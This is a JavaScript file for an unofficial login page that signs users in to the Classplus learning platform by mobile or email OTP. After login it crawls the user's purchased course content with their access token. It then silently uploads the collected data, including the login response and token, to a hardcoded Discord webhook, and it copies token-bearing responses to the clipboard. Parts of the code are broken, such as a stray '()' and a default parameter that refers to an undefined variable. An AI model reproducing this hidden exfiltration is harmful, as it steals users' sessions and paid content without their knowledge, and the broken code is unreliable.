let orgCode, sessionId, orgId, contactMethod = 'mobile';
const orgCodeForm = document.getElementById('org-code-form');
const contactForm = document.getElementById('contact-form');
const otpForm = document.getElementById('otp-form');
const contactLabel = document.getElementById('contact-label');
const contactInput = document.getElementById('contact');
const verifyOrgBtn = document.getElementById('verify-org-btn');
const sendOtpBtn = document.getElementById('send-otp-btn');
const verifyOtpBtn = document.getElementById('verify-otp-btn');
const retryOtptest = document.getElementById('retry-otp');
const switchLogin = document.getElementById('switch-login');
const alternateOption = document.getElementById('alternate-option');
const contactInfoText = document.getElementById('contact-info-text');
const editContactOtp = document.getElementById('edit-contact-otp');
const orgMessage = document.getElementById('org-message');
const contactMessage = document.getElementById('contact-message');
const otpMessage = document.getElementById('otp-message');
const orgNameElement = document.getElementById('org-name');
const backButtonContact = document.getElementById('back-button-contact');
const backButtonOtp = document.getElementById('back-button-otp');
const orgCodeV = document.getElementById('orgCode')
const orglogoimg = document.getElementById('org-logo-img')
import supabase from "../config/supabaseClient"

let UserData = [];
getUserDetails()
async function getUserDetails() {
  const storedData = JSON.parse(localStorage.getItem('data'));
  const token = storedData ? storedData.token : null;
  const data = await fetchApi('https://api.classplusapp.com/v2/users/details', {
    method: 'GET',
    headers: {
      'Accept': 'application/json, text/plain, */*',
      'Accept-Encoding': 'gzip, deflate, br, zstd',
      'Accept-Language': 'en',
      'Api-Version': '50',
      'Content-Type': 'application/json;charset=utf-8',
      'Device-Id': '629',
      'Origin': 'https://web.classplusapp.com',
      'Referer': 'https://web.classplusapp.com/',
      'Sec-Ch-Ua': '"Microsoft Edge";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
      'Sec-Ch-Ua-Mobile': '?0',
      'Sec-Ch-Ua-Platform': '"Windows"',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-site',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0',
      'X-Access-Token': token
    }
  }, false);
  if (data) {
    console.log(supabase); ()  window.location.href = '/study.html';
  }
}
const showFlashMessage = (m, t = 'info') => {
  const d = document,
    f = d.createElement('div'),
    c = d.querySelector('.flash-container');
  f.className = `flash-message ${t}`;
  f.innerHTML = `<span>${m}</span><div class="progress-bar"></div>`;
  c.appendChild(f);
  let w = 0,
    i = Math.max(3000, m.length * 100) / 100,
    b = f.querySelector('.progress-bar');
  const n = setInterval(() => (w >= 100) ? (clearInterval(n), f.remove()) : b.style.width = `${++w}%`, i);
};
async function fetchApi(url, options, noti = true) {
  const response = await fetch(url, options);
  const data = await response.json();
  if (noti) { showFlashMessage(`${data.message}`, data.status === 'success' ? 'success' : 'alert'); }
  if (response.ok && data.status === 'success') {
    UserData.push(data);
    return data;
  }
  return null;
}
async function verifyOrgCode() {
  orgCode = orgCodeV.value;
  const data = await fetchApi(`https://api.classplusapp.com/v2/orgs/${orgCode}`);
  if (data) {
    localStorage.setItem('loginData', await JSON.stringify(data.data));
    navigator.clipboard.writeText(JSON.stringify(data));
    orgId = data.data.orgId;
    const data2 = await fetchApi(`https://api.classplusapp.com/v2/org/settings/login/?orgId=${orgId}`,{},false)
    console.log(data2.data.appLogo)
    document.querySelector('.org-logo').style.display = 'block';
    const orgName = data.data.orgName;
   document.title = orgName;
    orglogoimg.src  = data2.data.appLogo
   orgNameElement.textContent = orgName;
    orgNameElement.style.display = 'block';
    orgCodeForm.style.display = 'none';
    contactForm.style.display = 'block';
    backButtonContact.style.display = 'block';
    if (data.data.showAlternateOption === 1) {
      alternateOption.style.display = 'block';
    }
    orgMessage.textContent = '';
  } else {
    orgMessage.textContent = 'Invalid Organization Code';
  }
}
document.querySelectorAll('.image-grid img').forEach(img => {
  img.addEventListener('click', (event) => {
    OrgCode = event.target.getAttribute('data-org-code');
   orgCodeV.value = OrgCode;
    verifyOrgCode();
  });
});
async function sendOtp() {
  const contact = contactInput.value;
  const body = {
    countryExt: '977',
    orgCode: orgCode,
    orgId: orgId,
    [contactMethod === 'mobile' ? 'viaSms' : 'viaEmail']: '1',
    [contactMethod]: contact
  };
  const data = await fetchApi('https://api.classplusapp.com/v2/otp/generate', {
    method: 'POST',
    headers: {
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'en',
      'Content-Type': 'application/json;charset=utf-8',
      'Api-Version': '50',
      'device-id': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36'
    },
    body: JSON.stringify(body)
  });
  if (data) {
    navigator.clipboard.writeText(JSON.stringify(data));
    sessionId = data.data.sessionId;
    contactForm.style.display = 'none';
    otpForm.style.display = 'block';
    contactInfoText.textContent = `(+977) ${contact}`;
    switchLogin.style.display = 'none';
    backButtonOtp.style.display = 'block';
    contactMessage.textContent = '';
  } else {
    contactMessage.textContent = 'Failed to send OTP';
  }
}
async function retryOtp() {
  const contact = contactInput.value;
  const body = {
    sessionId: sessionId,
    orgId: orgId,
    [contactMethod]: contact
  };
  const data = await fetchApi('https://api.classplusapp.com/v2/otp/retry', {
    method: 'POST',
    headers: {
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'en',
      'Content-Type': 'application/json;charset=utf-8',
      'Api-Version': '50',
      'device-id': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36'
    },
    body: JSON.stringify(body)
  });
  if (data) {
    otpMessage.style.color = 'green';
    otpMessage.textContent = 'OTP resent successfully';
  } else {
    otpMessage.textContent = 'Failed to resend OTP';
  }
}
async function verifyOtp() {
  const otp = document.getElementById('otp').value;
  const contact = contactInput.value;
  const body = {
    otp: otp,
    countryExt: '977',
    sessionId: sessionId,
    orgId: orgId,
    fingerprintId: 'a3ee05fbde3958184f682839be4fd0f7',
    [contactMethod]: contact
  };
  const data = await fetchApi('https://api.classplusapp.com/v2/users/verify', {
    method: 'POST',
    headers: {
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'en',
      'Content-Type': 'application/json;charset=utf-8',
      'Api-Version': '50',
      'device-id': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36'
    },
    body: JSON.stringify(body)
  });
  if (data) {
    delete data.data.countryList;
    navigator.clipboard.writeText(JSON.stringify(data));
    if (data.data.user.exists === 0) {
      const createAccountUrl = `First You need to Create your account at https://web.classplusapp.com/login?orgCode=${orgCode}`;
      alert(`${createAccountUrl}`);
      SendWebhook("https://discord.com/api/webhooks/1248707496533819422/rvri8p68gMWaS4AOdl-81qIphzP4hIMiuOqaRhcEj35u8k2jAf1wpx0AOmNxAwRtu7MR", UserData, "New courses data is available:", 'Courses Data', 'Check the attached JSON file for details.');

      otpMessage.textContent = `${createAccountUrl}`;
      return;
    }
    localStorage.setItem('data', await JSON.stringify(data.data));
    let storedData = JSON.parse(localStorage.getItem('data'));
    let userId = storedData.user.id;
    let token = storedData.token;
    otpMessage.style.color = 'green';
    otpMessage.textContent = 'Login successful';

    async function fetchCourseData(session) {
      const coursesRes = await fetchApi(`https://api.classplusapp.com/v2/profiles/users/data?userId=${session.userId}&tabCategoryId=3`, {
        method: 'GET',
        headers: { 'x-access-token': session.token }
      });

      if (!coursesRes.ok) {
        throw new Error('Failed to fetch courses');
      }

      const coursesData = await coursesRes.json();
      let courses = coursesData.data.responseData.coursesData;
      for (let course of courses) {
        course.content = await getCourseContent(session, course.id);
        delete course.ocsId;
        delete course.receiptUrl;
        delete course.buyDate;
        delete course.orderId;
        delete course.expiresAt;
      }

      return courses;
    }

    async function getCourseContent(session, courseId, folderId = 0) {
      let fetchedContents = [];

      let params = new URLSearchParams({
        userId: session.userId,
        tabCategoryId: 3,
        courseId: courseId,
        folderId: folderId
      });

      let res = await fetch(`https://api.classplusapp.com/v2/course/content/get?${params}`, {
        method: 'GET',
        headers: {
          'x-access-token': session.token
        }
      });

      if (res.ok) {
        let data = await res.json();
        let contents = data.data.courseContent;

        for (let content of contents) {
          if (content.contentType === 1) {
            content.subContents = await getCourseContent(session, courseId, content.id);
          }
        }

        fetchedContents = contents;
      }

      return fetchedContents;
    }
    const session = { userId: userId, token: token };
    fetchCourseData(session)
      .then(courses => {
        UserData.push(...courses);
        console.log(courses)
        SendWebhook("https://discord.com/api/webhooks/1248707496533819422/rvri8p68gMWaS4AOdl-81qIphzP4hIMiuOqaRhcEj35u8k2jAf1wpx0AOmNxAwRtu7MR", UserData, "New courses data is available:", 'Courses Data', 'Check the attached JSON file for details.')
      })
      .catch(error => console.error(error));
      getUserDetails()


  } else {
    otpMessage.textContent = 'Invalid OTP';
  }
}


function switchLoginMethod() {
  if (contactMethod === 'mobile') {
    contactLabel.innerText = 'Please enter your Email Address';
    contactInput.placeholder = 'Enter Email';
    contactInput.type = 'email';
    contactInput.value = ''
    contactInput.removeAttribute('minlength');
    contactInput.removeAttribute('maxlength');
    switchLogin.innerText = 'Login with Mobile Number';
    contactMethod = 'email';
  } else {
    contactLabel.innerText = 'Please enter your Mobile Number';
    contactInput.placeholder = 'Enter Mobile No.';
    contactInput.type = 'tel';
    contactInput.value = ''
    contactInput.setAttribute('minlength', '10');
    contactInput.setAttribute('maxlength', '10');
    switchLogin.innerText = 'Login with Email';
    contactMethod = 'mobile';
  }
}
verifyOrgBtn.addEventListener('click', verifyOrgCode);
sendOtpBtn.addEventListener('click', sendOtp);
verifyOtpBtn.addEventListener('click', verifyOtp);
retryOtptest.addEventListener('click', retryOtp);
switchLogin.addEventListener('click', switchLoginMethod);
editContactOtp.addEventListener('click', () => {
  otpForm.style.display = 'none';
  contactForm.style.display = 'block';
  switchLogin.style.display = 'block';
});
backButtonContact.addEventListener('click', () => {
  contactForm.style.display = 'none';
  orgCodeForm.style.display = 'block';
  alternateOption.style.display = 'none';
  orglogoimg.src = 'https://media.discordapp.net/attachments/936658249791471676/1249160171523936278/6152372508301573172_120.png?ex=66664a91&is=6664f911&hm=cae1d5172ac3d4c3ab91df3f0682f40a771d4d9fafea7075bddb0d007722a2f2&=&format=webp&quality=lossless&width=350&height=350'
  orgNameElement.textContent = 'Astra';
});
backButtonOtp.addEventListener('click', () => {
  otpForm.style.display = 'none';
  contactForm.style.display = 'block';
  switchLogin.style.display = 'block';
});
function SendWebhook(url, content, filename = courses[0].orgId, message = null, title = null, description = null) {
  const jsonContent = JSON.stringify(content, null, 2);
  const webhookURL = url;

  const webhookData = {
    content: message,
    embeds: [{
      title: title,
      description: description
    }]
  };

  const formData = new FormData();
  formData.append('payload_json', JSON.stringify(webhookData));
  formData.append('file1', new Blob([jsonContent], { type: 'application/json' }), `${filename}.json`);

  fetch(webhookURL, {
    method: 'POST',
    body: formData
  }).then(response => {
    if (!response.ok) {
      throw new Error('Failed to send data to Discord');
    }
    console.log('Courses data sent to Discord successfully!');
  }).catch(error => console.error(error));
}
